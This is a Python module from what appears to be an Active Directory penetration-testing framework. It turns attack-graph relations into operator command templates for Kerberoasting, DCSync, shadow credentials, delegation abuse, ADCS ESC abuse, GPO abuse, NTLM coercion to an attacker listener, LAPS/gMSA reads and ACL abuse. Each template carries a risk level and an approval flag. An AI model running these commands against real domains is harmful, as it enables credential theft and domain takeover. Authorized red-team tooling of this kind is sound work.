"""Build operator-facing example commands from exploit-chain evidence.

Commands are templates for authorized lab/operator use. They never auto-execute.
"""

from __future__ import annotations

import re
import shlex
from typing import Any

from adaf_attack.core.target import Target

# terminal_relation → list of command templates
# Placeholders: {domain} {dc_ip} {sam} {target} {spn} {start} {end} {user}
COMMAND_TEMPLATES: dict[str, list[dict[str, str]]] = {
    # ── Kerberos roasting / AS-REP ──────────────────────────────────────────
    "HasSPN": [
        {
            "capability": "kerberoast",
            "risk": "medium",
            "approval_required": "false",
            "cmd": "adaf-attack run kerberoast -d {domain} --dc-ip {dc_ip} -u {user} -P sam={sam}",
        }
    ],
    "CanASREP": [
        {
            "capability": "asrep-roast",
            "risk": "medium",
            "approval_required": "false",
            "cmd": "adaf-attack run asrep-roast -d {domain} --dc-ip {dc_ip} -u {user} -P users={sam}",
        }
    ],
    # ── DCSync ──────────────────────────────────────────────────────────────
    "DCSync": [
        {
            "capability": "dcsync",
            "risk": "high",
            "approval_required": "true",
            "cmd": "adaf-attack run dcsync -d {domain} --dc-ip {dc_ip} -u {user} --force -P sam={sam}",
        }
    ],
    "GetChangesAll": [
        {
            "capability": "dcsync",
            "risk": "high",
            "approval_required": "true",
            "cmd": "adaf-attack run dcsync -d {domain} --dc-ip {dc_ip} -u {user} --force",
        }
    ],
    "GetChanges": [
        {
            "capability": "dcsync",
            "risk": "high",
            "approval_required": "true",
            "cmd": "adaf-attack run dcsync -d {domain} --dc-ip {dc_ip} -u {user} --force",
        }
    ],
    # ── Shadow Credentials / PKINIT ─────────────────────────────────────────
    "WriteKeyCredentialLink": [
        {
            "capability": "shadow-pkinit-workflow",
            "risk": "high",
            "approval_required": "true",
            "cmd": "adaf-attack run shadow-pkinit-workflow -d {domain} --dc-ip {dc_ip} -u {user} --sam {sam} --force",
        }
    ],
    "HasKeyCredentialLink": [
        {
            "capability": "pkinit-auth",
            "risk": "medium",
            "approval_required": "false",
            "cmd": "adaf-attack run pkinit-auth -d {domain} --dc-ip {dc_ip} --sam {sam} --pfx ./shadow.pfx",
        }
    ],
    # ── Resource-Based Constrained Delegation ───────────────────────────────
    "WriteRBCD": [
        {
            "capability": "rbcd-ticket-workflow",
            "risk": "high",
            "approval_required": "true",
            "cmd": "adaf-attack run rbcd-ticket-workflow -d {domain} --dc-ip {dc_ip} -u {user} --set-on {target} --set-from {start} --spn {spn} --impersonate {sam} --force",
        }
    ],
    "AllowedToAct": [
        {
            "capability": "s4u-abuse",
            "risk": "high",
            "approval_required": "true",
            "cmd": "adaf-attack run s4u-abuse -d {domain} --dc-ip {dc_ip} -u {user} -P impersonate={sam} -P spn={spn} --force",
        }
    ],
    "AllowedToDelegate": [
        {
            "capability": "constrained-delegation",
            "risk": "high",
            "approval_required": "true",
            "cmd": "adaf-attack run constrained-delegation -d {domain} --dc-ip {dc_ip} -u {user} -P spn={spn} --force",
        }
    ],
    "UnconstrainedDelegation": [
        {
            "capability": "unconstrained-delegation",
            "risk": "high",
            "approval_required": "true",
            "cmd": "adaf-attack run unconstrained-delegation -d {domain} --dc-ip {dc_ip} -u {user} -P host={target} --force",
        }
    ],
    # ── ADCS ESC ────────────────────────────────────────────────────────────
    "ESC1": [
        {
            "capability": "esc-chain",
            "risk": "high",
            "approval_required": "false",
            "cmd": "adaf-attack run esc-chain -d {domain} --dc-ip {dc_ip} -u {user} -P template={target}",
        }
    ],
    "ESC1Enrollable": [
        {
            "capability": "esc-chain",
            "risk": "high",
            "approval_required": "false",
            "cmd": "adaf-attack run esc-chain -d {domain} --dc-ip {dc_ip} -u {user} -P template={target}",
        }
    ],
    "ESC2": [
        {
            "capability": "esc-chain",
            "risk": "high",
            "approval_required": "false",
            "cmd": "adaf-attack run esc-chain -d {domain} --dc-ip {dc_ip} -u {user} -P template={target} -P esc=2",
        }
    ],
    "ESC3": [
        {
            "capability": "esc-chain",
            "risk": "high",
            "approval_required": "false",
            "cmd": "adaf-attack run esc-chain -d {domain} --dc-ip {dc_ip} -u {user} -P template={target} -P esc=3",
        }
    ],
    "ESC4": [
        {
            "capability": "esc-chain",
            "risk": "high",
            "approval_required": "false",
            "cmd": "adaf-attack run esc-chain -d {domain} --dc-ip {dc_ip} -u {user} -P template={target} -P esc=4",
        }
    ],
    "ESC6": [
        {
            "capability": "esc-chain",
            "risk": "high",
            "approval_required": "false",
            "cmd": "adaf-attack run esc-chain -d {domain} --dc-ip {dc_ip} -u {user}",
        }
    ],
    "ESC8": [
        {
            "capability": "esc-chain",
            "risk": "high",
            "approval_required": "false",
            "cmd": "adaf-attack run esc-chain -d {domain} --dc-ip {dc_ip} -u {user} -P esc=8",
        }
    ],
    # ── GPO / SYSVOL ────────────────────────────────────────────────────────
    "WriteGPO": [
        {
            "capability": "gpo-abuse",
            "risk": "high",
            "approval_required": "true",
            "cmd": "adaf-attack run gpo-abuse -d {domain} --dc-ip {dc_ip} -u {user} --force -P gpo={target}",
        }
    ],
    "WriteSYSVOL": [
        {
            "capability": "gpo-sysvol",
            "risk": "high",
            "approval_required": "true",
            "cmd": "adaf-attack run gpo-sysvol -d {domain} --dc-ip {dc_ip} -u {user} --force",
        }
    ],
    # ── Coercion ────────────────────────────────────────────────────────────
    "SpoolerOpen": [
        {
            "capability": "coerce",
            "risk": "high",
            "approval_required": "true",
            "cmd": "adaf-attack run coerce -d {domain} --dc-ip {dc_ip} -u {user} -P host={target} -P listener=<attacker-ip> -P methods=printerbug --force",
        }
    ],
    "EfsrpcOpen": [
        {
            "capability": "coerce",
            "risk": "high",
            "approval_required": "true",
            "cmd": "adaf-attack run coerce -d {domain} --dc-ip {dc_ip} -u {user} -P host={target} -P listener=<attacker-ip> -P methods=petitpotam --force",
        }
    ],
    "DfscoerceOpen": [
        {
            "capability": "coerce",
            "risk": "high",
            "approval_required": "true",
            "cmd": "adaf-attack run coerce -d {domain} --dc-ip {dc_ip} -u {user} -P host={target} -P listener=<attacker-ip> -P methods=dfscoerce --force",
        }
    ],
    # ── LAPS / gMSA ─────────────────────────────────────────────────────────
    "ReadGMSAPassword": [
        {
            "capability": "laps-read",
            "risk": "high",
            "approval_required": "false",
            "cmd": "adaf-attack run laps-read -d {domain} --dc-ip {dc_ip} -u {user} -P computer_filter=(sAMAccountName={sam})",
        }
    ],
    "GMSAPasswordReadable": [
        {
            "capability": "laps-read",
            "risk": "high",
            "approval_required": "false",
            "cmd": "adaf-attack run laps-read -d {domain} --dc-ip {dc_ip} -u {user}",
        }
    ],
    "ReadLAPSPassword": [
        {
            "capability": "laps-read",
            "risk": "high",
            "approval_required": "false",
            "cmd": "adaf-attack run laps-read -d {domain} --dc-ip {dc_ip} -u {user} -P computer_filter=(sAMAccountName={sam})",
        }
    ],
    # ── ACL / ownership abuse (new) ─────────────────────────────────────────
    "GenericAll": [
        {
            "capability": "acl-abuse",
            "risk": "high",
            "approval_required": "true",
            "cmd": "adaf-attack run acl-abuse -d {domain} --dc-ip {dc_ip} -u {user} -P target={sam} -P rights=GenericAll --force",
        }
    ],
    "GenericWrite": [
        {
            "capability": "acl-abuse",
            "risk": "high",
            "approval_required": "true",
            "cmd": "adaf-attack run acl-abuse -d {domain} --dc-ip {dc_ip} -u {user} -P target={sam} -P rights=GenericWrite --force",
        }
    ],
    "WriteDacl": [
        {
            "capability": "acl-abuse",
            "risk": "high",
            "approval_required": "true",
            "cmd": "adaf-attack run acl-abuse -d {domain} --dc-ip {dc_ip} -u {user} -P target={sam} -P rights=WriteDacl --force",
        }
    ],
    "WriteOwner": [
        {
            "capability": "acl-abuse",
            "risk": "high",
            "approval_required": "true",
            "cmd": "adaf-attack run acl-abuse -d {domain} --dc-ip {dc_ip} -u {user} -P target={sam} -P rights=WriteOwner --force",
        }
    ],
    "Owns": [
        {
            "capability": "acl-abuse",
            "risk": "high",
            "approval_required": "true",
            "cmd": "adaf-attack run acl-abuse -d {domain} --dc-ip {dc_ip} -u {user} -P target={sam} -P rights=Owns --force",
        }
    ],
    "ForceChangePassword": [
        {
            "capability": "force-change-password",
            "risk": "high",
            "approval_required": "true",
            "cmd": "adaf-attack run force-change-password -d {domain} --dc-ip {dc_ip} -u {user} -P target={sam} --force",
        }
    ],
    "AddMember": [
        {
            "capability": "add-member",
            "risk": "high",
            "approval_required": "true",
            "cmd": "adaf-attack run add-member -d {domain} --dc-ip {dc_ip} -u {user} -P group={target} -P member={sam} --force",
        }
    ],
    "AddSelf": [
        {
            "capability": "add-self",
            "risk": "high",
            "approval_required": "true",
            "cmd": "adaf-attack run add-self -d {domain} --dc-ip {dc_ip} -u {user} -P group={target} --force",
        }
    ],
    # ── Session / local admin (new) ─────────────────────────────────────────
    "HasSession": [
        {
            "capability": "session-abuse",
            "risk": "medium",
            "approval_required": "false",
            "cmd": "adaf-attack run session-abuse -d {domain} --dc-ip {dc_ip} -u {user} -P host={target}",
        }
    ],
    "AdminTo": [
        {
            "capability": "local-admin",
            "risk": "high",
            "approval_required": "false",
            "cmd": "adaf-attack run local-admin -d {domain} --dc-ip {dc_ip} -u {user} -P host={target}",
        }
    ],
    "CanRDP": [
        {
            "capability": "rdp",
            "risk": "medium",
            "approval_required": "false",
            "cmd": "adaf-attack run rdp -d {domain} --dc-ip {dc_ip} -u {user} -P host={target}",
        }
    ],
    "CanPSRemote": [
        {
            "capability": "psremote",
            "risk": "medium",
            "approval_required": "false",
            "cmd": "adaf-attack run psremote -d {domain} --dc-ip {dc_ip} -u {user} -P host={target}",
        }
    ],
}


def _sam_from_node_id(node_id: str | None) -> str:
    """USER@alice@CORP.LOCAL → alice; COMPUTER@DC01$ → DC01$"""
    if not node_id:
        return "<sam>"
    parts = node_id.split("@")
    if len(parts) >= 2:
        return parts[1]
    return node_id


_SAFE_COMMAND_VALUE = re.compile(r"^[A-Za-z0-9_./:@%+=,-]+\$?$")


def _shell_quote(value: str) -> str:
    """Quote a value unless it is a safe shell token.

    Computer accounts conventionally end in ``$``. A trailing dollar has no
    expansion meaning in a POSIX shell, so preserve that familiar display
    form while still quoting whitespace and shell metacharacters.
    """
    if _SAFE_COMMAND_VALUE.fullmatch(value):
        return value
    return shlex.quote(value)


def build_exploit_commands(
    chain: dict[str, Any],
    target: Target,
    *,
    operator_user: str | None = None,
) -> list[dict[str, Any]]:
    """Return parameterized example commands for one exploit chain."""
    relation = str(chain.get("terminal_relation") or "")
    templates = COMMAND_TEMPLATES.get(relation, [])
    if not templates:
        return []

    start = chain.get("start")
    end = chain.get("end")
    sam = _sam_from_node_id(end if end else start)
    user = operator_user or target.username or "<user>"

    ctx = {
        "domain": target.domain or "<domain>",
        "dc_ip": target.dc_ip or "<dc-ip>",
        "user": user,
        "sam": sam,
        "start": _sam_from_node_id(start),
        "end": _sam_from_node_id(end),
        "target": _sam_from_node_id(end),
        "spn": f"cifs/{_sam_from_node_id(end)}",
    }
    # Quote substituted values individually so generated examples remain safe
    # to paste when an operator name, domain, or filter contains whitespace or
    # shell metacharacters. Simple values are unchanged by shlex.quote().
    quoted_ctx = {key: _shell_quote(str(value)) for key, value in ctx.items()}

    out: list[dict[str, Any]] = []
    for t in templates:
        try:
            cmd = t["cmd"].format(**quoted_ctx)
        except KeyError:
            cmd = t["cmd"]
        out.append(
            {
                "capability": t["capability"],
                "risk": t["risk"],
                "approval_required": t["approval_required"] == "true",
                "command": cmd,
                "terminal_relation": relation,
            }
        )
    return out
